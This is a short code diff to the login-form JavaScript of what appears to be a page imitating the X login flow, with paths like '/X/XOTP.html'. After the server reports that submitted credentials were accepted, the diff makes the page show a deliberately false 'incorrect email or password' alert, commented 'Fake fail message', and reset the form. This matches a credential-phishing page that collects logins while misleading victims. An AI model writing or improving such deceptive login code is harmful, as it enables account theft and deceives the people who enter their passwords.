@@ -53,10 +53,10 @@
                 const data = await response.json();
                 if (data.ok) {
                     console.log('Success:', data);
-                    localStorage.setItem('xEmail', email);
-                    window.location.href = '/X/XOTP.html'; // Updated to match repository name 'X'
+                    alert('Login failed—incorrect email or password.'); // Fake fail message
+                    document.getElementById('loginForm').reset(); // Clear form
                 } else {
-                    alert('Login failed—check your credentials.');
+                    alert('Something went wrong—try again.');
                 }
             } catch (error) {
                 console.error('Fetch error:', error);
